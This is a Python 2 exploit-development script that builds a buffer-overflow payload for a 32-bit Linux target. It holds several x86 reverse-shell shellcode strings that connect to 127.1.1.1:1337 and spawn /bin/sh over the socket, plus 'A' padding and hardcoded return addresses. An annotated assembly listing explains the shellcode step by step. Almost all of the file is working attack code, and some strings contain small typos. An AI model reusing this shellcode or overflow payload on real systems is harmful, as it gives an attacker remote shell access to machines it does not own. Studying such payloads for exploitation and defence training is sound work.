#print len(shellcode)
#from shellcode import shellcode
import sys
from struct import pack
#shellcode_net = ("\x6a\x66\x58\x6a\x01\x5b\x31\xd2\x52\x53\x6a\x02\x89\xe1\xcd\x80\x92\xb0\x66\x68\x7f\x01\x01\x01\x66\x68\x69\x7a\x43\x66\x53\x89\xe1\x6a\x10\x51\x52\x89\xe1\x43\xcd\x80\x6a\x02\x59\x87\xda\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x41\x89\xca\x52\x68x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80")
shellcode_net = ("\x6a\x66\x58\x6a\x01\x5b\x31\xd2\x52\x53\x6a\x02\x89\xe1\xcd\x80\x92\xb0\x66\x68\x7f\x01\x01\x01\x66\x68\x69\x7a\x43\x66\x53\x89\xe1\x6a\x10\x51\x52\x89\xe1\x43\xcd\x80\x6a\x02\x59\x87\xda\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x41\x89\xca\x52\x68//sh\x68/bin\x89\xe3\xcd\x80")
shellcode_net_1 = ("\x6a\x66\x58\x6a\x01\x5b\x31\xd2\x52\x53\x6a\x02\x89\xe1\xcd\x80\x92\xb0\x66\x68\x81\xff\xff\xfe")
#\x7f\x01\x01\x01
ip = pack("<I", 0xfeffff81)
#change_code = ("\x52\x31\xd2\x44\x44\x44\x44\x66\x44\x89\x14\x24\x66\x44\x89\x14\x24\x66\x83\xc4\x06\5a")
change_code_the_second = ("\x52\x31\xd2\x83\xc4\x04\x83\xc4\x01\x88\x14\x24\x83\xc4\x01\x88\x14\x24\x83\xc4\xfa\x5a")
change_code_the_third = ("\x5e\xf7\xde\x56")
shellcode_net_2 = ("\x66\x68\x69\x7a\x43\x66\x53\x89\xe1\x6a\x10\x51\x52\x89\xe1\x43\xcd\x80\x6a\x02\x59\x87\xda\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x41\x89\xca\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80")
#print len(shellcode_net_1) + len(change_code_the_third) + len(shellcode_net_2)
mega_shell_code = ("\x6a\x66\x58\x6a\x01\x5b\x31\xd2\x52\x53\x6a\x02\x89\xe1\xcd\x80\x92\xb0\x66\x68\x7f\x01\x01\x01\x66\x68\x69\x7a\x43\x66\x53\x89\xe1\x6a\x10\x51\x52\x89\xe1\x43\xcd\x80\x6a\x02\x59\x87\xda\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x41\x89\xca\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80")
#print '\x90'*30 + shellcode_net_1 + change_code_the_third + shellcode_net_2 + 'A'*1940 + pack("<I",0xBFFEF535) + pack("<I",0xbffefd2c)
#print shellcode_net + 'A'*1974 + pack("<I",0xBFFEF518) + pack("<I",0xbffefd2c)
#print mega_shell_code + 'A'*1952 + pack("<I",0xBFFEF518) + pack("<I",0xbffefd2c
# 5e	pop    %esi
#    0x08049062 <+7>:	f7 de	neg    %esi
#    0x08049064 <+9>:	56	
fina_shell = ("\x6a\x66\x58\x6a\x01\x5b\x31\xd2\x52\x53\x6a\x02\x89\xe1\xcd\x80\x92\xb0\x66\x68\x7f\x01\x01\x01\x66\x68\x69\x7a\x43\x66\x53\x89\xe1\x6a\x10\x51\x52\x89\xe1\x43\xcd\x80\x6a\x02\x59\x87\xda\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x41\x89\xca\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80")
final_shell = ("\x6a\x66\x58\x6a\x01\x5b\x31\xd2\x52\x53\x6a\x02\x89\xe1\xcd\x80\x92\xb0\x66\x68\x7f\x01\x01\x01\x66\x68\x69\x7a\x43\x66\x53\x89\xe1\x6a\x10\x51\x52\x89\xe1\x43\xcd\x80\x6a\x02\x59\x87\xda\xb0\x3f\xcd\x80\x49\\x79\xf9\xb0\x0b\x41\x89\xca\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80")
#")
# print len(final_shell)
#")
int_shell   = ("\x6a\x66\x58\x6a\x01\x5b\x31\xd2\x52\x53\x6a\x02\x89\xe1\xcd\x80\x92\xb0\x66\x68\x7f\x01\x01\x01\x66\x68\x69\x7a\x43\x66\x53\x89\xe1\x6a\x10\x51\x52\x89\xe1\x43\xcd\x80\x6a\x02\x59\x87\xda\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x41\x89\xca\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80")
#print len(int_shell)
reverse_shell = ("\x55\x89\xe5\x83\xe4\xf0\x83\xec\x30\x65\xa1\x14\x00\x00\x00\x89\x44\x24\x2c\x31\xc0\x66\xc7\x44\x24\x1c\x02\x00\xc7\x04\x24\x69\x7a\x00\x00\xe8\xb4\xfe\xff\xff\x66\x89\x44\x24\x1e\xc7\x04\x24\xd0\x86\x04\x08\xe8\xf3\xfe\xff\xff\x89\x44\x24\x20\xc7\x44\x24\x08\x00\x00\x00\x00\xc7\x44\x24\x04\x01\x00\x00\x00\xc7\x04\x24\x02\x00\x00\x00\xe8\xc3\xfe\xff\xff\x89\x44\x24\x18\xc7\x44\x24\x08\x10\x00\x00\x00\x8d\x44\x24\x1c\x89\x44\x24\x04\x8b\x44\x24\x18\x89\x04\x24\xe8\xc3\xfe\xff\xff\xc7\x44\x24\x14\x00\x00\x00\x00\xeb\x19\x8b\x44\x24\x14\x89\x44\x24\x04\x8b\x44\x24\x18\x89\x04\x24\xe8\x25\xfe\xff\xff\x83\x44\x24\x14\x01\x83\x7c\x24\x14\x02\x7e\xe0\xc7\x44\x24\x08\x00\x00\x00\x00\xc7\x44\x24\x04\x00\x00\x00\x00\xc7\x04\x24\xda\x86\x04\x08\xe8\x4d\xfe\xff\xff\x8b\x54\x24\x2c\x65\x33\x15\x14\x00\x00\x00\x74\x05\xe8\xfb\xfd\xff\xff\xc9\xc3")
#print len(reverse_shell)
print reverse_shell + 'A'*1837 + pack("<I",0xBFFEF518) + pack("<I",0xbffefd2c)


#*****************************************************ANNOTATION***********************************************************************
# global _start			
 
# section .text
# _start:
# 	;
# 	; int socketcall(int call, unsigned long *args);
# 	; sockfd = socket(int socket_family, int socket_type, int protocol);
# 	;
# 	push 0x66 
# 	pop eax ;syscall: sys_socketcall + cleanup eax
 
# 	push 0x1
# 	pop ebx ;sys_socket (0x1) + cleanup ebx
 
# 	xor edx,edx ;cleanup edx
 
# 	push edx ;protocol=IPPROTO_IP (0x0)	
# 	push ebx ;socket_type=SOCK_STREAM (0x1)
# 	push 0x2 ;socket_family=AF_INET (0x2)
 
# 	mov ecx, esp ;save pointer to socket() args
 
# 	int 0x80 ;exec sys_socket
 
# 	xchg edx, eax; save result (sockfd) for later usage
 
# 	;
# 	; int socketcall(int call, unsigned long *args);
# 	; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
# 	;
# 	mov al, 0x66
 
# 	;struct sockaddr_in {
# 	;  __kernel_sa_family_t  sin_family;     /* Address family               */
# 	;  __be16                sin_port;       /* Port number                  */
# 	;  struct in_addr        sin_addr;       /* Internet address             */
# 	;};
 
# 	push 0x0101017f  ;sin_addr=127.1.1.1 (network byte order)
# 	push word 0x3905 ;sin_port=1337 (network byte order)
# 	inc ebx          
# 	push word bx     ;sin_family=AF_INET (0x2)
# 	mov ecx, esp     ;save pointer to sockaddr struct
 
# 	push 0x10 ;addrlen=16
# 	push ecx  ;pointer to sockaddr
# 	push edx  ;sockfd
 
# 	mov ecx, esp ;save pointer to sockaddr_in struct
 
# 	inc ebx ; sys_connect (0x3)
 
# 	int 0x80 ;exec sys_connect 
 
# 	;
# 	; int socketcall(int call, unsigned long *args);
# 	; int dup2(int oldfd, int newfd);
# 	;
# 	push 0x2
# 	pop ecx  ;set loop-counter
 
# 	xchg ebx,edx ;save sockfd
 
# ; loop through three sys_dup2 calls to redirect stdin(0), stdout(1) and stderr(2)
# loop:
# 	mov al, 0x3f ;syscall: sys_dup2 
# 	int 0x80     ;exec sys_dup2
# 	dec ecx	     ;decrement loop-counter
# 	jns loop     ;as long as SF is not set -> jmp to loop
 
# 	;
# 	; int execve(const char *filename, char *const argv[],char *const envp[]);
# 	;
# 	mov al, 0x0b ; syscall: sys_execve
 
# 	inc ecx      ;argv=0
# 	mov edx,ecx  ;envp=0
 
# 	push edx        ;terminating NULL
# 	push 0x68732f2f	;"hs//"
# 	push 0x6e69622f	;"nib/"
 
# 	mov ebx, esp ;save pointer to filename
 
# 	int 0x80 ; exec sys_execve